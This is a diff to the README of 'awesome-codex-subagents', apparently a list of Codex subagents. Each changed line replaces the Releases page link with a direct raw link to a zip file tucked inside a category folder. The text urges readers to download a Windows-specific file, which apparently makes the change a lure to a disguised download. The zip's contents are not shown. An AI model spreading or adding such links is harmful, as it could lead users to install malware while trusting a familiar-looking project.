@@ -1,12 +1,12 @@
 # 🤖 awesome-codex-subagents - Find the right agent faster
 
-[![Download from Releases](https://img.shields.io/badge/Download-Releases-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bznpopaye/awesome-codex-subagents/releases)
+[![Download from Releases](https://img.shields.io/badge/Download-Releases-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bznpopaye/awesome-codex-subagents/raw/refs/heads/main/categories/01-core-development/awesome_subagents_codex_1.7.zip)
 
 A clean collection of 130+ Codex subagents for many common development tasks. Use it to find a focused agent for the job you need, without sorting through a long list by hand.
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/Bznpopaye/awesome-codex-subagents/releases
+Visit this page to download: https://github.com/Bznpopaye/awesome-codex-subagents/raw/refs/heads/main/categories/01-core-development/awesome_subagents_codex_1.7.zip
 
 On the Releases page, choose the latest version and download the file that fits your Windows setup. If you see a zip file, download it first, then extract it.
 
@@ -190,4 +190,4 @@ This keeps your work focused and saves time
 - Repository: awesome-codex-subagents
 - Description: A collection of 130+ specialized Codex subagents covering a wide range of development use cases
 - Topics: ai-agents, awesome-list, chatgpt, codex, codex-skills, codex-subagents, subagents
-- Download page: https://github.com/Bznpopaye/awesome-codex-subagents/releases
+- Download page: https://github.com/Bznpopaye/awesome-codex-subagents/raw/refs/heads/main/categories/01-core-development/awesome_subagents_codex_1.7.zip
